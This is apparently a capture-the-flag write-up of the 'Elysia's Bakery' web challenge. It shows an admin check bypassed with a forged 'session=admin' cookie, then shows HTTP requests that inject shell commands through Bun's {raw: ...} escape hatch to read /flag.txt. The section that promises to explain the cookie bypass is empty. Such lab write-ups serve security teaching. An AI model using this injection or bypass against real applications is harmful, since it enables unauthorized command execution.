#### Elysia's Bakery
- points earned: 50
#### Where's the flag?
- The flag is copied to `/flag.txt` during container creation.
- There are no other references to file in the source code so we must be looking for an arbitrary file read or command exectution.
#### Notes / Intuition
- After some code review I came across the line below in the `/admin/list` route.  This is how you run a shell command in bun.
	```js
	const result = $`ls ${folder}`.quiet();
	```
- The `/admin/list` route requires that there is a valid `session` and that `session.isAdmin` is not falsey.
	```js
	const data = getSessionData(session);
	if (!data) return status(401, "Unauthorized");
	if (!data.isAdmin) return status(403, "Forbidden");
	```
- Through general testing I was able to identify that something is wrong with the way cookies are handled.
	- For example, the `GET /notes` route is setup to return a list of note UUIDs for a specific user.
	- For valid request the session cookie looks like `session=meowBark.s%2BrI4Ib3igPyVBCaAaeSLNZQS6YIfYIKPhl3MvGV8uo`.
	- However, if I change the session cookie to something invalid like `session=meowBarkMoo.s%2BrI4Ib3igPyVBCaAaeSLNZQS6YIfYIKPhl3MvGV8uo` then the response is an empty list of notes.
		- This is weird because I would expect to get a 401 - Unauthorized.
- Based on the last item I started doing some testing on the `POST /admin/list` route and was able to determine that the authorization checks can be bypassed.
	- I first tried sending a POST to `/admin/list` with a cookie like `session=admin.s%2BrI4Ib3igPyVBCaAaeSLNZQS6YIfYIKPhl3MvGV8uo` but got a 401 - Unauthorized.
	- I then tried another request where the cookie was `session=admin` and this worked! Nice!
- It's worth noting here that, during the CTF, I did not understand why this worked but just continued on because time is limited.  I did review this after the CTF and will go into further detail about this in a section below.
- Although Bun is supposed does it's own escaping for variable in shell commands, there is a bit of a footgun to get around this.
	- Since bun does it's own quoting for variables in statements like this:
		```js
		const result = $`ls ${folder}`.quiet();
		```
	- I cannot just set folder to something like the below, because the backticks will be quoted properly
		```js
		`cat /flag.txt`
		```
	- However, after doing some looking around in the docs I came across this concept:
		```
		If you do not want your string to be escaped, wrap it in a `{ raw: 'str' }` object
		```
	- Based on this I tried the request below:
		```json
		POST /admin/list HTTP/1.1
		Host: me:3000
		Cookie: session=admin
		Content-Type: application/json
		
		{"folder":{"raw":"`echo meow`"}}
		```
	- Which returns
		```json
		{ "error": "ls: meow: No such file or directory\n" }
		```
	- Which means that the command injection was successful because it tried to `ls meow`
	- Thats pretty much it, all we have to do now is read the flag.

#### Why am I able to bypass the admin cookie checks?

#### Solution
```json
POST /admin/list HTTP/1.1
Host: me:3000
Cookie: session=admin
Content-Type: application/json

{ "folder": 
	{
		"raw": "`cat /flag.txt`"
	}
}
```
- the response to this request will contain the flag.